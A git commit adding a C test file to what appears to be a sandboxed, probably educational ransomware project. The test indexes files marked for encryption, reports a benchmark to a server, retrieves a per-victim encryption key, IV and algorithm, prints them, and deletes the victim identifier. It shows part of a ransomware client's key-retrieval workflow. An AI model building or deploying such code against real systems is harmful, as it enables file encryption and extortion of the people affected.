8fbc3fe36bd495bc5df94357e2b640baf6d26d14
leJBP <jb.prevost62@gmail.com>
2024-06-08 15:58:14 -0400

    création test delete id

---
+++ victim/tests/test_delete_id.c
@@ -0,0 +1,49 @@
+#include <stdio.h>
+
+#include "../benchmark.h"
+#include "../server.h"
+#include "../files_finder.h"
+
+int main(int argc, char const *argv[])
+{
+
+    char* paths[] = {"/tmp/sandbox-ransomware/"};
+    char* p_algo = NULL;
+    char* p_iv = NULL;
+
+    unsigned char* id = NULL;
+    id = get_identifier();
+
+    /* Initialisation de la structure pour la recherche de fichier */
+    listFileData* p_listFileData = init_list_file_data();
+
+    /* Indexation des fichiers à chiffrer */
+    files_finder(p_listFileData, paths, 1);
+
+    /* Affichage des fichiers indexés */
+    //print_path_data(p_listFileData);
+
+    /* Envoi du benchmark au serveur */
+    benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
+
+    p_benchmarkData->memorySize = 1000;
+    p_benchmarkData->dataSize = 99999999999999;
+    p_benchmarkData->cpuCore = 1;
+
+    char* p_key = get_encryption_key((char*)id, p_benchmarkData, &p_algo, &p_iv);
+
+    printf("key: %s\n", p_key);
+    printf("iv: %s\n", p_iv);
+    printf("Algo: %s\n", p_algo);
+
+    /* Delete id */
+    delete_id(id);
+
+    free_path_data(p_listFileData);
+    free(id);
+    free(p_key);
+    free(p_algo);
+    free(p_iv);
+
+    return 0;
+}
